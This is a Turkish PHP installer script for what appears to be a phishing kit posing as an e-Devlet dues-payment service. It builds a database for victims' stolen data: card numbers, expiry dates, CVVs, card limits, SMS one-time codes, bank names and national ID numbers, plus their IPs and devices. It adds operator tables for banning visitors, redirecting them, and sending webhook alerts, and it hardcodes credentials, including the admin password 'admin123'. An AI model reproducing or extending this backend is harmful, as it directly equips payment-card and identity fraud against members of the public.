#!/usr/bin/env php
<?php
/**
 * Otomatik Kurulum Script
 *
 * Kullanım: php setup.php
 */

echo "\n";
echo "================================================\n";
echo "  EDEVLET AIDAT SİSTEMİ - KURULUM\n";
echo "================================================\n\n";

// Adım 1: Veritabanı Bağlantısı
echo "📦 Adım 1: Veritabanı bilgilerini girin\n\n";

$host = readline("MySQL Host [127.0.0.1]: ") ?: "127.0.0.1";
$port = readline("MySQL Port [3306]: ") ?: "3306";
$root_user = readline("MySQL Root Kullanıcı [dayko_aidat]: ") ?: "dayko_aidat";
$root_pass = readline("MySQL Root Şifre [5Nl?0l9j1]: ") ?: "5Nl?0l9j1";

echo "\n";

// Test bağlantısı
try {
    $conn = new mysqli($host, $root_user, $root_pass, null, $port);
    
    if ($conn->connect_error) {
        die("❌ Bağlantı hatası: " . $conn->connect_error . "\n");
    }
    
    echo "✓ MySQL bağlantısı başarılı!\n\n";
    
    // Adım 2: Veritabanı Oluştur
    echo "📦 Adım 2: Veritabanı oluşturuluyor...\n";
    
    $db_name = "edevletaidat";
    $sql = "CREATE DATABASE IF NOT EXISTS {$db_name} CHARACTER SET utf8mb4 COLLATE utf8mb4_turkish_ci";
    
    if ($conn->query($sql) === TRUE) {
        echo "✓ Veritabanı '{$db_name}' oluşturuldu\n";
    } else {
        echo "⚠ Veritabanı zaten mevcut veya oluşturulamadı\n";
    }
    
    // Veritabanını seç
    $conn->select_db($db_name);
    
    // Adım 3: Tabloları Oluştur
    echo "\n📦 Adım 3: Tablolar oluşturuluyor...\n";
    
    $tables = [
        "ban" => "CREATE TABLE IF NOT EXISTS `ban` (
            `id` INT AUTO_INCREMENT PRIMARY KEY,
            `ban` VARCHAR(255) NOT NULL,
            `ulke` TEXT NOT NULL,
            `date` VARCHAR(255) NOT NULL,
            `cihaz` VARCHAR(255) NOT NULL,
            `tarayici` VARCHAR(255) NOT NULL,
            INDEX `idx_ban` (`ban`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_turkish_ci",
        
        "back" => "CREATE TABLE IF NOT EXISTS `back` (
            `id` INT AUTO_INCREMENT PRIMARY KEY,
            `back` VARCHAR(255) NOT NULL,
            INDEX `idx_back` (`back`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_turkish_ci",
        
        "hata1" => "CREATE TABLE IF NOT EXISTS `hata1` (
            `id` INT AUTO_INCREMENT PRIMARY KEY,
            `hata1` VARCHAR(255) NOT NULL,
            INDEX `idx_hata1` (`hata1`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci",
        
        "hata2" => "CREATE TABLE IF NOT EXISTS `hata2` (
            `id` INT AUTO_INCREMENT PRIMARY KEY,
            `hata2` VARCHAR(255) NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci",
        
        "hata3" => "CREATE TABLE IF NOT EXISTS `hata3` (
            `id` INT AUTO_INCREMENT PRIMARY KEY,
            `hata3` VARCHAR(255) NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci",
        
        "ips" => "CREATE TABLE IF NOT EXISTS `ips` (
            `id` BIGINT(20) NOT NULL AUTO_INCREMENT PRIMARY KEY,
            `ipAddress` VARCHAR(255) NOT NULL,
            `lastOnline` BIGINT(255) NOT NULL,
            UNIQUE KEY `ipAddress` (`ipAddress`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci",
        
        "paneldekiler" => "CREATE TABLE IF NOT EXISTS `paneldekiler` (
            `id` INT AUTO_INCREMENT PRIMARY KEY,
            `ip` TEXT NOT NULL,
            `tarih` TEXT NOT NULL,
            `tarayici` VARCHAR(255) NOT NULL,
            `durum` TEXT NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci",
        
        "sazan" => "CREATE TABLE IF NOT EXISTS `sazan` (
            `id` INT(11) NOT NULL AUTO_INCREMENT PRIMARY KEY,
            `date` VARCHAR(255) NOT NULL,
            `kk` VARCHAR(255) DEFAULT NULL,
            `sonkul` VARCHAR(255) DEFAULT NULL,
            `cvv` VARCHAR(255) DEFAULT NULL,
            `kartlimit` VARCHAR(50) DEFAULT NULL,
            `sms` VARCHAR(255) DEFAULT NULL,
            `now` VARCHAR(255) NOT NULL DEFAULT 'Anasayfa',
            `back` INT(11) NOT NULL DEFAULT 0,
            `ip` VARCHAR(255) NOT NULL,
            `lastOnline` BIGINT(20) DEFAULT NULL,
            `banka` VARCHAR(255) DEFAULT NULL,
            `tc` VARCHAR(255) NOT NULL,
            `cihaz` VARCHAR(255) NOT NULL,
            `tarayici` VARCHAR(255) NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_turkish_ci",
        
        "site" => "CREATE TABLE IF NOT EXISTS `site` (
            `id` INT(11) NOT NULL AUTO_INCREMENT PRIMARY KEY,
            `pass` TEXT NOT NULL,
            `kart_sesi` INT(11) NOT NULL DEFAULT 0,
            `sms_sesi` INT(11) NOT NULL DEFAULT 0,
            `webhook` INT(11) NOT NULL DEFAULT 0,
            `webhookURL` VARCHAR(255) NOT NULL,
            `tutar` VARCHAR(255) NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci",
        
        "sms" => "CREATE TABLE IF NOT EXISTS `sms` (
            `id` INT AUTO_INCREMENT PRIMARY KEY,
            `sms` VARCHAR(255) NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci",
        
        "tebrik" => "CREATE TABLE IF NOT EXISTS `tebrik` (
            `id` INT AUTO_INCREMENT PRIMARY KEY,
            `tebrik` VARCHAR(255) NOT NULL
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci"
    ];
    
    foreach ($tables as $table_name => $sql) {
        if ($conn->query($sql) === TRUE) {
            echo "  ✓ Tablo '{$table_name}' oluşturuldu\n";
        } else {
            echo "  ⚠ Tablo '{$table_name}' hatası: " . $conn->error . "\n";
        }
    }
    
    // Varsayılan veri ekle
    echo "\n📦 Adım 4: Varsayılan veriler ekleniyor...\n";
    
    $sql = "INSERT INTO `site` (`id`, `pass`, `kart_sesi`, `sms_sesi`, `webhook`, `webhookURL`, `tutar`) 
            VALUES (1, 'admin123', 0, 0, 0, '.', '150')
            ON DUPLICATE KEY UPDATE `pass` = 'admin123'";
    
    if ($conn->query($sql) === TRUE) {
        echo "✓ Site ayarları eklendi (Şifre: admin123)\n";
    }
    
    // Kullanıcı oluştur
    echo "\n📦 Adım 5: Veritabanı kullanıcısı oluşturuluyor...\n";
    
    $db_user = "edevlet_user";
    $db_pass = "eDevlet" . date('Y') . "!Secure";
    
    // Eski kullanıcıyı sil
    @$conn->query("DROP USER IF EXISTS '{$db_user}'@'localhost'");
    @$conn->query("DROP USER IF EXISTS '{$db_user}'@'127.0.0.1'");
    @$conn->query("DROP USER IF EXISTS '{$db_user}'@'%'");
    
    // Yeni kullanıcı oluştur
    $sql = "CREATE USER '{$db_user}'@'localhost' IDENTIFIED BY '{$db_pass}'";
    $conn->query($sql);
    $sql = "CREATE USER '{$db_user}'@'127.0.0.1' IDENTIFIED BY '{$db_pass}'";
    $conn->query($sql);
    
    // Yetki ver
    $sql = "GRANT ALL PRIVILEGES ON {$db_name}.* TO '{$db_user}'@'localhost'";
    $conn->query($sql);
    $sql = "GRANT ALL PRIVILEGES ON {$db_name}.* TO '{$db_user}'@'127.0.0.1'";
    $conn->query($sql);
    $conn->query("FLUSH PRIVILEGES");
    
    echo "✓ Kullanıcı '{$db_user}' oluşturuldu\n";
    
    // .env dosyası oluştur
    echo "\n📦 Adım 6: Yapılandırma dosyası oluşturuluyor...\n";
    
    $env_content = "# Veritabanı Ayarları (Otomatik oluşturuldu)
DB_HOST={$host}
DB_PORT={$port}
DB_USERNAME={$db_user}
DB_PASSWORD={$db_pass}
DB_DATABASE={$db_name}
DB_CHARSET=utf8mb4
DB_SOCKET=

APP_DEBUG=true
APP_ENV=local
";
    
    file_put_contents(__DIR__ . '/.env', $env_content);
    echo "✓ .env dosyası oluşturuldu\n";
    
    // mysql.php dosyasını güncelle
    $mysql_content = "<?php
ob_start();
@session_start();
error_reporting(0);

// Veritabanı Bağlantı Ayarları
\$host = '{$host}';
\$port = {$port};
\$kullanici = '{$db_user}';
\$sifre = '{$db_pass}';
\$db_isim = '{$db_name}';
\$socket = null;

// Connection String ile bağlantı oluştur
\$conn = new MySQLi(\$host, \$kullanici, \$sifre, \$db_isim, \$port, \$socket);

// Karakter seti ayarla
mysqli_set_charset(\$conn, \"utf8mb4\");

// Bağlantı kontrolü
if (\$conn->connect_error) {
    error_log(\"MySQL Bağlantı Hatası: \" . \$conn->connect_error);
    die('Veritabanı Bağlantısı Hatası: ' . \$conn->connect_errno . ' - ' . \$conn->connect_error);
}

// Session'a kaydet
\$_SESSION[\"mysqli\"] = \$conn;
\$_SESSION[\"query\"] = null;
";
    
    file_put_contents(__DIR__ . '/mysql.php', $mysql_content);
    echo "✓ mysql.php dosyası güncellendi\n";
    
    // Özet
    echo "\n";
    echo "================================================\n";
    echo "  ✓ KURULUM TAMAMLANDI!\n";
    echo "================================================\n\n";
    echo "📋 Veritabanı Bilgileri:\n";
    echo "   Host: {$host}\n";
    echo "   Port: {$port}\n";
    echo "   Database: {$db_name}\n";
    echo "   Kullanıcı: {$db_user}\n";
    echo "   Şifre: {$db_pass}\n\n";
    echo "📋 Admin Panel:\n";
    echo "   Şifre: admin123\n\n";
    echo "🚀 Başlatma:\n";
    echo "   http://localhost/3d4/index.php\n\n";
    
    $conn->close();
    
} catch (Exception $e) {
    die("❌ Hata: " . $e->getMessage() . "\n");
}
